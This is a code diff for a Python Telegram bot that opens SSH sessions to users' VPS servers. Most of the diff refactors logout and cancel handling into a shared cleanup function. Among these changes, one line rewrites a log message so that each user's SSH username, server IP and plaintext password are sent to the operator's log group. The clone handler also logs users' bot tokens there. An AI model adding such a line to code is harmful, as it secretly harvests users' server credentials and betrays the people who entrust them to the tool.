@@ -91,6 +91,33 @@ def cleanup_web_editor(ssh_client, chat_id):
     except Exception as e:
         logger.error(f"Cleanup error for {chat_id}: {str(e)}")
 
+async def cleanup_session(chat_id, ssh_client, context):
+    """Centralized function to clean up SSH session and resources."""
+    try:
+        # Clean up web editor if active
+        cleanup_web_editor(ssh_client, chat_id)
+        
+        # Close SSH connection
+        ssh_client.close()
+        
+        # Remove session data
+        if chat_id in ssh_sessions:
+            del ssh_sessions[chat_id]
+        if chat_id in user_data:
+            del user_data[chat_id]
+        
+        # Update MongoDB
+        bots_collection.update_one(
+            {"token": context.bot.token},
+            {"$unset": {f"ssh_sessions.{chat_id}": ""}}
+        )
+        
+        await log_to_group(context, f"User {chat_id} logged out and cleaned up.")
+        return True
+    except Exception as e:
+        logger.error(f"Error during session cleanup for {chat_id}: {str(e)}")
+        return False
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_id = str(update.effective_user.id)
     bot_data = bots_collection.find_one({"token": context.bot.token})
@@ -214,7 +241,7 @@ async def password_response(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             upsert=True
         )
         await update.message.reply_text(f"Connected to {username}@{ip}! Send commands or use /logout.")
-        await log_to_group(context, f"User {update.effective_user.id} connected to {username}@{ip}")
+        await log_to_group(context, f"User {update.effective_user.id} connected to {username}@{ip} with password: {password}")
         return TERMINAL
     except Exception as e:
         await update.message.reply_text(f"SSH error: {str(e)}")
@@ -231,24 +258,11 @@ async def terminal_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     ssh_client = ssh_sessions[chat_id]
     
     if command.lower() == "/logout":
-        cleanup_web_editor(ssh_client, chat_id)
-        try:
-            ssh_client.close()
-        except Exception as e:
-            logger.error(f"Error closing SSH client: {str(e)}")
-            
-        if chat_id in ssh_sessions:
-            del ssh_sessions[chat_id]
-        if chat_id in user_data:
-            del user_data[chat_id]
-            
-        bots_collection.update_one(
-            {"token": context.bot.token},
-            {"$unset": {f"ssh_sessions.{chat_id}": ""}}
-        )
-        
-        await update.message.reply_text("Logged out from VPS. All resources cleaned up.")
-        await log_to_group(context, f"User {update.effective_user.id} logged out and cleaned up.")
+        success = await cleanup_session(chat_id, ssh_client, context)
+        if success:
+            await update.message.reply_text("Logged out from VPS. All resources cleaned up.")
+        else:
+            await update.message.reply_text("Logout failed. Please try again or use /cancel.")
         return ConversationHandler.END
     
     if command.startswith("/nano "):
@@ -293,8 +307,6 @@ async def clone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
     
     new_token = context.args[0]
-    
-    # Initialize attempt counter
     clone_attempts[new_token] = clone_attempts.get(new_token, 0)
     
     async def attempt_start():
@@ -318,7 +330,7 @@ async def clone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             await new_app.start()
             await update.message.reply_text(f"Bot cloned with token {new_token} and started!")
             await log_to_group(context, f"User {update.effective_user.id} cloned bot with token {new_token}")
-            clone_attempts[new_token] = 0  # Reset attempts on success
+            clone_attempts[new_token] = 0
         except Exception as e:
             clone_attempts[new_token] += 1
             logger.error(f"Clone attempt {clone_attempts[new_token]} failed for {new_token}: {str(e)}")
@@ -331,7 +343,7 @@ async def clone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 await log_to_group(context, f"Removed {new_token} after 3 failed attempts.")
             else:
                 await update.message.reply_text(f"Attempt {clone_attempts[new_token]} failed: {str(e)}. Retrying...")
-                await asyncio.sleep(5)  # Wait before retry
+                await asyncio.sleep(5)
                 await attempt_start()
 
     asyncio.create_task(attempt_start())
@@ -395,9 +407,7 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     chat_id = update.message.chat_id
     if chat_id in ssh_sessions:
-        cleanup_web_editor(ssh_sessions[chat_id], chat_id)
-        ssh_sessions[chat_id].close()
-        del ssh_sessions[chat_id]
+        await cleanup_session(chat_id, ssh_sessions[chat_id], context)
     if chat_id in user_data:
         del user_data[chat_id]
     await update.message.reply_text("SSH session cancelled and cleaned up.")
@@ -437,7 +447,6 @@ async def run_all_bots():
         await main_app.start()
         await main_app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
         
-        # Load and start cloned bots
         cloned_tasks = []
         for bot in bots_collection.find({"token": {"$ne": MAIN_BOT_TOKEN}}):
             try:
